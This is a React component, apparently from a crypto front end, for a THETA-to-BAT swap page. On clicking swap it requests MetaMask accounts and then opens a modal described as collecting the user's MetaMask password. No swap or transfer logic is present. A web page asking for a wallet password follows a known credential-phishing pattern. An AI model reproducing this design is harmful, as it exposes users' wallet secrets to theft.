import React, { useState } from "react";
import { Button } from "@material-tailwind/react";
import { ethers } from "ethers"; // Import ethers.js
import PasswordModal from "../modal/PasswordModal";


function Swap() {
  const [modalOpen, setModalOpen] = useState(false);

  // Function to handle the swap button click
  const handleSwap = async () => {
    if (typeof window.ethereum !== "undefined") {
      try {
        // Request account access if needed
        await window.ethereum.request({ method: "eth_requestAccounts" });

        // Open the modal to enter MetaMask password
        setModalOpen(true);
      } catch (error) {
        console.error("User denied account access or error occurred:", error);
      }
    } else {
      console.log("MetaMask is not installed.");
    }
  };

  const handleModalClose = () => {
    setModalOpen(false);
  };

  const handlePasswordConfirm = () => {
    // Perform any specific action upon password confirmation
    console.log("Proceeding with swap logic after password confirmation...");

    // Close the modal
    setModalOpen(false);
  };

  return (
    <div className="bg-blue-gray-100 h-screen p-8">
      <div className="text-center text-2xl">Swap Theta coins to BATs</div>
      <div className="grid place-content-center p-12">
        <div className="bg-white m-6 p-10 text-lg rounded-2xl shadow-lg shadow-blue-gray-200 ">
          <div className="">
            <span>
              <input
                type="text"
                placeholder="amount"
                className="m-2 p-1 focus:outline-none col text-gray-500"
              />
            </span>
            <span>THETA</span>
          </div>
          <div className="grid place-content-center">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              strokeWidth="1.5"
              stroke="currentColor"
              className="size-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M3 7.5L7.5 3m0 0L12 7.5M7.5 3v13.5m13.5 0L16.5 21m0 0L12 16.5m4.5 4.5V7.5"
              />
            </svg>
          </div>
          <div>
            <span>
              <input
                type="text"
                placeholder="amount"
                className="m-2 p-1 focus:outline-none col text-gray-500"
              />
            </span>
            <span>BAT</span>
          </div>
          <div
            className="block p-3 bg-black rounded-xl text-white text-center shadow-lg shadow-blue-gray-200 cursor-pointer"
            onClick={handleSwap}
          >
            swap
          </div>
        </div>
      </div>

      {modalOpen && (
        <PasswordModal
          onClose={handleModalClose}
          onConfirm={handlePasswordConfirm}
        />
      )}
    </div>
  );
}

export default Swap;
